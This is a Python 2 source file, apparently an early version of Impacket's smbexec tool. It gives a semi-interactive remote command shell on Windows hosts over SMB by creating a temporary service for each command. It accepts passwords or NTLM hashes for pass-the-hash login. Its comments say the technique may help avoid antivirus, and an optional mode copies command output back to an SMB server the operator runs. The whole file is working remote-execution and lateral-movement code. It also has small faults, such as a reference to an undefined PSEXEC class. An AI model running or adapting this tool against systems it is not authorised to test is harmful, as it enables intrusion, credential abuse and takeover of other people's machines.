#!/usr/bin/python
# Copyright (c) 2003-2013 CORE Security Technologies
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# $Id$
#
# A similar approach to psexec w/o using RemComSvc. The technique is described here
# http://www.accuvant.com/blog/2012/11/13/owning-computers-without-shell-access
# Our implementation goes one step further, instantiating a local smbserver to receive the 
# output of the commands. This is useful in the situation where the target machine does NOT
# have a writeable share available.
# Keep in mind that, although this technique might help avoiding AVs, there are a lot of 
# event logs generated and you can't expect executing tasks that will last long since Windows 
# will kill the process since it's not responding as a Windows service. 
# Certainly not a stealthy way.
#
# This script works in two ways:
# 1) share mode: you specify a share, and everything is done through that share.
# 2) server mode: if for any reason there's no share available, this script will launch a local
#    SMB server, so the output of the commands executed are sent back by the target machine
#    into a locally shared folder. Keep in mind you would need root access to bind to port 445 
#    in the local machine.
# 
# Author:
#  beto (bethus@gmail.com)
#
# Reference for:
#  DCE/RPC and SMB.

import sys
import os
import cmd
import argparse
import random
import string
import time
import ConfigParser
from threading import Thread

from impacket import version, smbserver
from impacket.smbconnection import *
from impacket.dcerpc import dcerpc_v4, dcerpc, transport, svcctl, srvsvc


OUTPUT_FILENAME = '__output'
BATCH_FILENAME  = 'execute.bat'
SMBSERVER_DIR   = '__tmp'
DUMMY_SHARE     = 'TMP'

class SMBServer(Thread):
    def __init__(self):
        Thread.__init__(self)

    def cleanup_server(self):
        print '[*] Cleaning up..'
        os.unlink(SMBSERVER_DIR + '/smb.log')
        os.rmdir(SMBSERVER_DIR)

    def run(self):
        # Here we write a mini config for the server
        smbConfig = ConfigParser.ConfigParser()
        smbConfig.add_section('global')
        smbConfig.set('global','server_name','server_name')
        smbConfig.set('global','server_os','UNIX')
        smbConfig.set('global','server_domain','WORKGROUP')
        smbConfig.set('global','log_file',SMBSERVER_DIR + '/smb.log')
        smbConfig.set('global','credentials_file','')

        # Let's add a dummy share
        smbConfig.add_section(DUMMY_SHARE)
        smbConfig.set(DUMMY_SHARE,'comment','')
        smbConfig.set(DUMMY_SHARE,'read only','no')
        smbConfig.set(DUMMY_SHARE,'share type','0')
        smbConfig.set(DUMMY_SHARE,'path',SMBSERVER_DIR)

        # IPC always needed
        smbConfig.add_section('IPC$')
        smbConfig.set('IPC$','comment','')
        smbConfig.set('IPC$','read only','yes')
        smbConfig.set('IPC$','share type','3')
        smbConfig.set('IPC$','path')

        self.smb = smbserver.SMBSERVER(('0.0.0.0',445), config_parser = smbConfig)
        print '[*] Creating tmp directory'
        try:
            os.mkdir(SMBSERVER_DIR)
        except Exception, e:
            print e
            pass
        print '[*] Setting up SMB Server'
        self.smb.processConfigFile()
        print '[*] Ready to listen...'
        try:
            self.smb.serve_forever()
        except:
            pass

    def stop(self):
        self.cleanup_server()
        self.smb.socket.close()
        self.smb.server_close()
        self._Thread__stop()

class CMDEXEC:
    KNOWN_PROTOCOLS = {
        '139/SMB': (r'ncacn_np:%s[\pipe\svcctl]', 139),
        '445/SMB': (r'ncacn_np:%s[\pipe\svcctl]', 445),
        }


    def __init__(self, protocols = None, 
                 username = '', password = '', domain = '', hashes = None, mode = None, share = None):
        if not protocols:
            protocols = PSEXEC.KNOWN_PROTOCOLS.keys()

        self.__username = username
        self.__password = password
        self.__protocols = [protocols]
        self.__serviceName = 'BTOBTO'.encode('utf-16le')
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__share = share
        self.__mode  = mode
        if hashes is not None:
            self.__lmhash, self.__nthash = hashes.split(':')

    def run(self, addr):
        for protocol in self.__protocols:
            protodef = CMDEXEC.KNOWN_PROTOCOLS[protocol]
            port = protodef[1]

            print "Trying protocol %s..." % protocol
            print "Creating service %s..." % self.__serviceName

            stringbinding = protodef[0] % addr

            rpctransport = transport.DCERPCTransportFactory(stringbinding)
            rpctransport.set_dport(port)

            if hasattr(rpctransport,'preferred_dialect'):
               rpctransport.preferred_dialect(SMB_DIALECT)
            if hasattr(rpctransport, 'set_credentials'):
                # This method exists only for selected protocol sequences.
                rpctransport.set_credentials(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)

            try:
                if self.__mode == 'SERVER':
                    serverThread = SMBServer()
                    serverThread.daemon = True
                    serverThread.start()
                self.shell = RemoteShell(self.__share, rpctransport, self.__mode, self.__serviceName)
                self.shell.cmdloop()
                if self.__mode == 'SERVER':
                    serverThread.stop()
            except  (Exception, KeyboardInterrupt), e:
                print e
                self.shell.finish()
                sys.stdout.flush()
                sys.exit(1)

class RemoteShell(cmd.Cmd):
    def __init__(self, share, rpc, mode, serviceName):
        cmd.Cmd.__init__(self)
        self.__share = share
        self.__mode = mode
        self.__output = '\\Windows\\Temp\\' + OUTPUT_FILENAME 
        self.__batchFile = '%TEMP%\\' + BATCH_FILENAME 
        self.__outputBuffer = ''
        self.__command = ''
        self.__shell = '%COMSPEC% /Q /c '
        self.__serviceName = serviceName
        self.__rpc = rpc
        self.intro = '[!] Launching semi-interactive shell - Careful what you execute'

        dce = dcerpc.DCERPC_v5(rpc)
        try:
            dce.connect()
        except Exception, e:
            print e
            sys.exit(1)

        s = rpc.get_smb_connection()

        # We don't wanna deal with timeouts from now on.
        s.setTimeout(100000)
        if mode == 'SERVER':
            myIPaddr = s.getSMBServer().get_socket().getsockname()[0]
            self.__copyBack = 'copy %s \\\\%s\\%s' % (self.__output, myIPaddr, DUMMY_SHARE)

        dce.bind(svcctl.MSRPC_UUID_SVCCTL)
        self.rpcsvc = svcctl.DCERPCSvcCtl(dce)
        resp = self.rpcsvc.OpenSCManagerW()
        self.__scHandle = resp['ContextHandle']
        self.transferClient = rpc.get_smb_connection()
        self.do_cd('')

    def finish(self):
        # Just in case the service is still created
        try:
           dce = dcerpc.DCERPC_v5(self.__rpc)
           dce.connect() 
           dce.bind(svcctl.MSRPC_UUID_SVCCTL)
           self.rpcsvc = svcctl.DCERPCSvcCtl(dce)
           resp = self.rpcsvc.OpenSCManagerW()
           self.__scHandle = resp['ContextHandle']
           resp = self.rpcsvc.OpenServiceW(self.__scHandle, self.__serviceName)
           service = resp['ContextHandle']
           self.rpcsvc.DeleteService(service)
           self.rpcsvc.StopService(service)
           self.rpcsvc.CloseServiceHandle(service)
        except Exception, e:
           pass

    def do_shell(self, s):
        os.system(s)

    def do_exit(self, s):
        return True

    def emptyline(self):
        return False

    def do_cd(self, s):
        self.execute_remote('cd ' + s)
        if len(self.__outputBuffer) > 0:
            # Stripping CR/LF
            self.prompt = string.replace(self.__outputBuffer,'\r\n','') + '>'
            self.__outputBuffer = ''

    def do_CD(self, s):
        return self.do_cd(s)

    def default(self, line):
        if line != '':
            self.send_data(line)

    def get_output(self):
        def output_callback(data):
            self.__outputBuffer += data

        if self.__mode == 'SHARE':
            self.transferClient.getFile(self.__share, self.__output, output_callback)
            self.transferClient.deleteFile(self.__share, self.__output)
        else:
            fd = open(SMBSERVER_DIR + '/' + OUTPUT_FILENAME,'r')
            output_callback(fd.read())
            fd.close()
            os.unlink(SMBSERVER_DIR + '/' + OUTPUT_FILENAME)

    def execute_remote(self, data):
        command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' > ' + self.__batchFile + ' & ' + self.__shell + self.__batchFile 
        if self.__mode == 'SERVER':
            command += ' & ' + self.__copyBack
        command += ' & ' + 'del ' + self.__batchFile 

        resp = self.rpcsvc.CreateServiceW(self.__scHandle, self.__serviceName, self.__serviceName, command.encode('utf-16le'))
        service = resp['ContextHandle']
        try:
           self.rpcsvc.StartServiceW(service)
        except:
           pass
        self.rpcsvc.DeleteService(service)
        self.rpcsvc.CloseServiceHandle(service)
        self.get_output()

    def send_data(self, data):
        self.execute_remote(data)
        print self.__outputBuffer
        self.__outputBuffer = ''


# Process command-line arguments.
if __name__ == '__main__':
    print version.BANNER

    parser = argparse.ArgumentParser()

    parser.add_argument('target', action='store', help='[domain/][username[:password]@]<address>')
    parser.add_argument('-share', action='store', default = 'C$', help='share where the output will be grabbed from (default C$)')
    parser.add_argument('-mode', action='store', choices = {'SERVER','SHARE'}, default='SHARE', help='mode to use (default SHARE, SERVER needs root!)')
    parser.add_argument('protocol', choices=CMDEXEC.KNOWN_PROTOCOLS.keys(), nargs='?', default='445/SMB', help='transport protocol (default 445/SMB)')

    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
 
    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    import re
    domain, username, password, address = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(options.target).groups('')

    if domain is None:
        domain = ''

    if password == '' and username != '' and options.hashes is None:
        from getpass import getpass
        password = getpass("Password:")

    executer = CMDEXEC(options.protocol, username, password, domain, options.hashes, options.mode, options.share)
    executer.run(address)
    sys.exit(0)
